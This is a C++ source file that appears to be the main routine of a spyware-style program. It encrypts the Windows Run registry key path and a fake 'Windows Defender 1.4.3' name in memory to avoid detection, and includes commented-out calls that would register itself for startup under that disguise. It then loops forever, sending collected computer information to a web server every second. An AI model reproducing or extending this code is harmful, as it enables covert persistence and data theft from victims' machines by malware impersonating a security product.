#include "Includes.h"

int main(int argc, char** argv) {
	//FreeConsole(); // Hides console

	{ // Infection of startup scope
		auto StartupKey = RCrypt("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"); // creates a encrypted instance
		StartupKey.encrypt(); // encryptes it in memory

		auto FakeApplicationName = RCrypt("Windows Defender 1.4.3"); // creates a encrypted instance
		FakeApplicationName.encrypt(); // encrypts for memory

		HKEY hkey = NULL; // Defines a key for r/w
		//LONG CreateStatus = RegCreateKey(HKEY_CURRENT_USER, StartupKey.decrypt(), &hkey); // creates key
		StartupKey.encrypt(); // Re-encrypts key in memory
		StartupKey.clear(); // Clears string from memory

		//LONG status = RegSetValueEx(hkey, FakeApplicationName.decrypt(), 0, REG_SZ, (BYTE*)argv[0], (string(argv[0]).size() + 1) * sizeof(wchar_t)); // Sets value
		FakeApplicationName.encrypt(); // Re-encrypts key in memory
		FakeApplicationName.clear(); // Clears string from memory
	}

	PCInfo* LocalPC;

	while (true) {
		LocalPC = new PCInfo(); // makes new instance of the computers info

		LocalPC->PushData(); // Pushes PC data to web-server

		Sleep(1000);
	}

}
